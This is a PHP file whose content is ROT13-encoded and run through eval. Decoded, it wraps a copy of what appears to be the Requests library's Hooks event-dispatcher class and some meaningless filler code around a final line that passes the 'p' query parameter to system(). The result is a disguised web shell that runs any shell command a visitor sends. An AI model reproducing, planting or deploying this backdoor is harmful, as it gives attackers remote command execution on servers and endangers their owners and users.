<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Unaqyrf nqqvat naq qvfcngpuvat riragf
 *
 * @cnpxntr Erdhrfgf\RiragQvfcngpure
 */

anzrfcnpr JcBet\Erdhrfgf;

hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\UbbxZnantre;
hfr JcBet\Erdhrfgf\Hgvyvgl\VachgInyvqngbe;

/**
 * Unaqyrf nqqvat naq qvfcngpuvat riragf
 *
 * @cnpxntr Erdhrfgf\RiragQvfcngpure
 */
pynff Ubbxf vzcyrzragf UbbxZnantre {
	/**
	 * Ertvfgrerq pnyyonpxf sbe rnpu ubbx
	 *
	 * @ine neenl
	 */
	cebgrpgrq $ubbxf = [];

	/**
	 * Ertvfgre n pnyyonpx sbe n ubbx
	 *
	 * @cnenz fgevat $ubbx Ubbx anzr
	 * @cnenz pnyynoyr $pnyyonpx Shapgvba/zrgubq gb pnyy ba rirag
	 * @cnenz vag $cevbevgl Cevbevgl ahzore. <0 vf rkrphgrq rneyvre, >0 vf rkrphgrq yngre
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $ubbx nethzrag vf abg n fgevat.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $pnyyonpx nethzrag vf abg pnyynoyr.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $cevbevgl nethzrag vf abg na vagrtre.
	 */
	choyvp shapgvba ertvfgre($ubbx, $pnyyonpx, $cevbevgl = 0) {
		vs (vf_fgevat($ubbx) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$ubbx', 'fgevat', trgglcr($ubbx));
		}

		vs (vf_pnyynoyr($pnyyonpx) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$pnyyonpx', 'pnyynoyr', trgglcr($pnyyonpx));
		}

		vs (VachgInyvqngbe::vf_ahzrevp_neenl_xrl($cevbevgl) === snyfr) {
			guebj VainyvqNethzrag::perngr(3, '$cevbevgl', 'vagrtre', trgglcr($cevbevgl));
		}

		vs (!vffrg($guvf->ubbxf[$ubbx])) {
			$guvf->ubbxf[$ubbx] = [
				$cevbevgl => [],
			];
		} ryfrvs (!vffrg($guvf->ubbxf[$ubbx][$cevbevgl])) {
			$guvf->ubbxf[$ubbx][$cevbevgl] = [];
		}

		$guvf->ubbxf[$ubbx][$cevbevgl][] = $pnyyonpx;
	}

	/**
	 * Qvfcngpu n zrffntr
	 *
	 * @cnenz fgevat $ubbx Ubbx anzr
	 * @cnenz neenl $cnenzrgref Cnenzrgref gb cnff gb pnyyonpxf
	 * @erghea obbyrna Fhpprffshyarff
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $ubbx nethzrag vf abg n fgevat.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $cnenzrgref nethzrag vf abg na neenl.
	 */
	choyvp shapgvba qvfcngpu($ubbx, $cnenzrgref = []) {
		vs (vf_fgevat($ubbx) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$ubbx', 'fgevat', trgglcr($ubbx));
		}

		// Purpx fgevpgyl ntnvafg neenl, nf Neenl* bowrpgf qba'g jbex va pbzovangvba jvgu `pnyy_hfre_shap_neenl()`.
		vs (vf_neenl($cnenzrgref) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$cnenzrgref', 'neenl', trgglcr($cnenzrgref));
		}

		vs (rzcgl($guvf->ubbxf[$ubbx])) {
			erghea snyfr;
		}

		vs (!rzcgl($cnenzrgref)) {
			// Fgevc cbgragvny xrlf sebz gur neenl gb cerirag gurz orvat vagrecergrq nf cnenzrgre anzrf va CUC 8.0.
			$cnenzrgref = neenl_inyhrf($cnenzrgref);
		}

		xfbeg($guvf->ubbxf[$ubbx]);

		sbernpu ($guvf->ubbxf[$ubbx] nf $cevbevgl => $ubbxrq) {
			sbernpu ($ubbxrq nf $pnyyonpx) {
				$pnyyonpx(...$cnenzrgref);
			}
		}

		erghea gehr;
	}

	choyvp shapgvba __jnxrhc() {
		guebj arj \YbtvpRkprcgvba( __PYNFF__ . ' fubhyq arire or hafrevnyvmrq' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>